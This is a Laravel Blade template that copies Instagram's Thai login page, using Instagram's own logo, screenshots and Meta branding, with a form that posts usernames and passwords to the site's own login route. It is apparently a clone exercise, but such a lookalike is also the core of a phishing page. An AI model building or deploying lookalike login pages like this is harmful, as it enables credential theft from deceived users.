<!DOCTYPE html>
<html lang="th">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Instagram</title>
    <link rel="stylesheet" href="{{asset('css/style.css')}}" />
  </head>
  <body>
    <main class="main">
      <section class="section-left">
        <div class="phone-container">
          <div class="phones">
          <img id="phone-screen-old" class="phone-screen" src="https://static.cdninstagram.com/images/instagram/xig/homepage/screenshots/screenshot1-2x.png">
          <img id="phone-screen-new" class="phone-screen hidden" src="">
        </div>
      </div>      
      </section>

      <section class="section-right">
        <div class="login-container">
          <i
            data-visualcompletion="css-img"
            aria-label="Instagram"
            class="logo-container"
            role="img"
            style="
              background-image: url('https://static.cdninstagram.com/rsrc.php/v4/yb/r/zsQl-NfXSne.png');
              width: 175px;
              height: 51px;
              display: inline-block;
            "></i>

          <form class="login-form" method="POST" action="{{ route('login') }}">
            @csrf
            <div class="form-group">
              <input
                type="text"
                placeholder="หมายเลขโทรศัพท์ ชื่อผู้ใช้ หรืออีเมล" name="username" />
            </div>
            <div class="form-group">
              <input type="password" placeholder="รหัสผ่าน" name="password" />
            </div>
            <button type="submit" class="login-button">เข้าสู่ระบบ</button>

            <div class="separator">
              <div class="line"></div>
              <div class="or">หรือ</div>
              <div class="line"></div>
            </div>

            <button type="button" class="facebook-login">
              <svg width="16" height="16" viewBox="0 0 16 16" fill="#0095f6">
                <path
                  d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z" />
              </svg>
              <span>เข้าสู่ระบบด้วย Facebook</span>
            </button>

            <a href="#" class="forgot-password">ลืมรหัสผ่านใช่ไหม</a>
          </form>
        </div>

        <div class="signup-container">
          <p>หากยังไม่มีบัญชี <a href="#">สมัครใช้งาน</a></p>
        </div>

        <div class="app-download">
          <p>ติดตั้งแอพ</p>
          <div class="store-buttons">
            <a href="#" class="store-button">
              <img
                src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png"
                alt="Get it on Google Play"
                class="google-play" />
            </a>
            <a href="#" class="store-button">
              <img
                src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png"
                alt="Get it from Microsoft"
                class="microsoft-store" />
            </a>
          </div>
        </div>
      </section>
    </main>

    <footer class="footer">
      <nav class="footer-nav">
        <ul>
          <li><a href="#">Meta</a></li>
          <li><a href="#">เกี่ยวกับ</a></li>
          <li><a href="#">บล็อก</a></li>
          <li><a href="#">งาน</a></li>
          <li><a href="#">ความช่วยเหลือ</a></li>
          <li><a href="#">API</a></li>
          <li><a href="#">ความเป็นส่วนตัว</a></li>
          <li><a href="#">ข้อกำหนด</a></li>
          <li><a href="#">ตำแหน่ง</a></li>
          <li><a href="#">Instagram Lite</a></li>
          <li><a href="#">Threads</a></li>
          <li><a href="#">การอัพโหลดผู้ติดต่อและผู้ที่ไม่ได้ใช้บริการ</a></li>
          <li><a href="#">Meta Verified</a></li>
        </ul>
        <div class="language-copyright">
          <select class="language-selector">
            <option value="th">ภาษาไทย</option>
          </select>
          <span class="copyright">© 2025 Instagram from Meta</span>
        </div>
      </nav>
    </footer>
  </body>
</html>

<script>
document.addEventListener("DOMContentLoaded", function () {
    const oldScreen = document.getElementById("phone-screen-old");
    const newScreen = document.getElementById("phone-screen-new");
    const images = [
        "https://static.cdninstagram.com/images/instagram/xig/homepage/screenshots/screenshot1-2x.png",
        "https://static.cdninstagram.com/images/instagram/xig/homepage/screenshots/screenshot2-2x.png",
        "https://static.cdninstagram.com/images/instagram/xig/homepage/screenshots/screenshot3-2x.png",
        "https://static.cdninstagram.com/images/instagram/xig/homepage/screenshots/screenshot4-2x.png"
    ];

    let currentIndex = 0;

    function changeScreenImage() {
        currentIndex = (currentIndex + 1) % images.length;
        newScreen.src = images[currentIndex];
        newScreen.classList.remove("hidden");
        
        setTimeout(() => {
            oldScreen.src = newScreen.src;
            newScreen.classList.add("hidden");
        }, 1000); 
    }

    setInterval(changeScreenImage, 4000);

});


</script>

